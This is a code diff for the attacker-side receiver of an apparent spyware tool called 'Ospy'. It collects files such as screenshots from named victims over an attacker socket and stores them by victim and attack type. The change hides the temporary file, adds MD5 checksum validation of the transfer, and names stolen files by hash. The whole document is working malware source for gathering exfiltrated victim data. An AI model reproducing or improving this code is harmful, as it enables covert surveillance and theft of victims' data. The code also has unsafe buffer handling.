@@ -1,7 +1,7 @@
 #include "connection.h"
 #include "utilities.h"
 
-#define ENCRYPTED_RECEIVED_FILE_NAME "Ospy/temp_enc_file"
+#define ENCRYPTED_RECEIVED_FILE_NAME "Ospy/.temp_enc_file"
 #define MAX_COMMEN_LEN 200
 #define CREATE_FOLDER_CMD_LEN 100
 
@@ -81,8 +81,15 @@ void crate_folders (char * victim_name, char * attack_type){
 
 FILE_RECEIVING_STATUS recv_file (char * victim_name, char * file_name, char * file_extension, char * attack_type){	
 	FILE * encrypted_receved_file;
-	file_transformation_protocol cour_file_buffer;
-	int sub_buffer_size = 0;
+	encrypted_file_transformation_protocol temp_file_data;
+	
+	char temp_checksum_full_buffer[MTU + HASH_LEN];
+	char temp_checksum[HASH_LEN];
+	
+	bzero(temp_file_data.file_sub_buffer, MTU); 
+	strcpy(temp_checksum, "\0");
+	memset(temp_checksum_full_buffer, '0', strlen(temp_checksum_full_buffer));
+	temp_file_data.end_of_file = 0;
 		
 	time_t rawtime = time(NULL);
 	if (rawtime == -1) {
@@ -94,45 +101,44 @@ FILE_RECEIVING_STATUS recv_file (char * victim_name, char * file_name, char * fi
 		puts("The localtime() function failed");
 		exit(1);
 	}
-	
 	crate_folders(victim_name, attack_type);
-	
-	// exempal of "file_path" : Ospy/ori_mac_mini/screenshots/screenshot_TueDec1117/24/012018
-	char file_path[MAX_USER_NAME_LEN + 100];
-	sprintf(file_path,"Ospy/%s/%s/%s_%d_%02d_%02d:%02d:%02d%s",victim_name, attack_type, file_name, (ptm->tm_year+1900), (ptm->tm_mon + 1), ptm->tm_hour, ptm->tm_min, ptm->tm_sec, file_extension);
 		
 	encrypted_receved_file = fopen(ENCRYPTED_RECEIVED_FILE_NAME, "w");
-	
 	if(encrypted_receved_file == NULL)
 		return FAILED_RECEIVING_FILE;
-		
-	bzero(cour_file_buffer.file_sub_buffer, MTU); 
-	cour_file_buffer.end_of_file = 0;
-	
-	while ((sub_buffer_size = recv(attacker_socket, cour_file_buffer.file_sub_buffer, sizeof(file_transformation_protocol),0)) > 0){
-		if (cour_file_buffer.end_of_file)
+			
+	while (recv(attacker_socket, temp_file_data.file_sub_buffer, sizeof(encrypted_file_transformation_protocol),0) > 0){
+		if (temp_file_data.end_of_file)
 			break;
-		fputs(cour_file_buffer.file_sub_buffer, encrypted_receved_file);
-//		printf("%s", cour_file_buffer.file_sub_buffer);
+		strcpy(temp_checksum_full_buffer, temp_checksum);
+		strcat(temp_checksum_full_buffer, temp_file_data.file_sub_buffer);
+		strcpy(temp_checksum, md5(temp_checksum_full_buffer));
+		fputs(temp_file_data.file_sub_buffer, encrypted_receved_file);
 		fflush(encrypted_receved_file);
-		bzero(cour_file_buffer.file_sub_buffer, MTU);
+		bzero(temp_file_data.file_sub_buffer, MTU);
 	}
 	fclose(encrypted_receved_file);
-	bace64_to_original_convertor(file_path);
+	if (strcmp(temp_checksum, temp_file_data.checksum) != 0)
+		return FAILED_RECEIVING_FILE;
 	
+	// exempal of "file_path" : Ospy/ori_mac_mini/screenshots/screenshot_16b1c83de8f9518e673838b2d6ea75dc
+	char file_path[MAX_USER_NAME_LEN + 100];
+	sprintf(file_path,"Ospy/%s/%s/%s_%s%s", victim_name, attack_type, file_name, temp_checksum, file_extension);
+//	sprintf(file_path,"Ospy/%s/%s/%s_%d_%02d_%02d:%02d:%02d%s", victim_name, attack_type, file_name, (ptm->tm_year+1900), (ptm->tm_mon + 1), ptm->tm_hour, ptm->tm_min, ptm->tm_sec, file_extension);
+	bace64_to_original_convertor(file_path);
+//	printf("\r[#] Hash checksum : %s\n", temp_file_data.checksum);
 	return FILE_RECEIVED;
 }
 
 void recv_file_and_print_it (){
-	int sub_buffer_size = 0;
-	file_transformation_protocol cour_file_buffer;
-	bzero(cour_file_buffer.file_sub_buffer, MTU); 
-	cour_file_buffer.end_of_file = 0;
-	while ((sub_buffer_size = recv(attacker_socket, cour_file_buffer.file_sub_buffer, sizeof(file_transformation_protocol), 0)) > 0){
-		if (cour_file_buffer.end_of_file)
+	encrypted_file_transformation_protocol temp_file_data;
+	bzero(temp_file_data.file_sub_buffer, MTU); 
+	temp_file_data.end_of_file = 0;
+	while (recv(attacker_socket, temp_file_data.file_sub_buffer, sizeof(encrypted_file_transformation_protocol), 0) > 0){
+		if (temp_file_data.end_of_file)
 			break;
-		printf("%s",cour_file_buffer.file_sub_buffer);
-		bzero(cour_file_buffer.file_sub_buffer, MTU);
+		printf("%s", temp_file_data.file_sub_buffer);
+		bzero(temp_file_data.file_sub_buffer, MTU);
 	}
 }
 
